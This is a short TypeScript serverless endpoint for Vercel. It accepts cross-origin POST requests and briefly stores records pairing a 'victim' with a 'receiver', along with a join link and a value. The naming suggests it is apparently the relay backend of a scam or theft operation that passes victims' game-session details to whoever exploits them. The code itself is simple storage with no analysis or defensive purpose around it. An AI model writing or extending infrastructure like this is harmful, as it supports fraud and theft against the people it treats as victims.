import { VercelRequest, VercelResponse } from '@vercel/node';
import { kv } from '@vercel/kv';

export default async function handler(req: VercelRequest, res: VercelResponse) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST');

    if (req.method !== 'POST') return res.status(405).json({ error: 'Method Not Allowed' });

    try {
        const { victim, receiver, joinLink, value } = req.body;
        if (!victim || !receiver) return res.status(400).json({ error: 'Missing Data' });

        const key = `session:${receiver}:${victim}`;
        
        await kv.set(key, JSON.stringify({
            victim,
            receiver,
            joinLink,
            value: value || 0,
            timestamp: Date.now()
        }), { ex: 25 });

        return res.status(200).json({ status: "ok" });
    } catch (error) {
        return res.status(500).json({ error: "Internal Error" });
    }
}
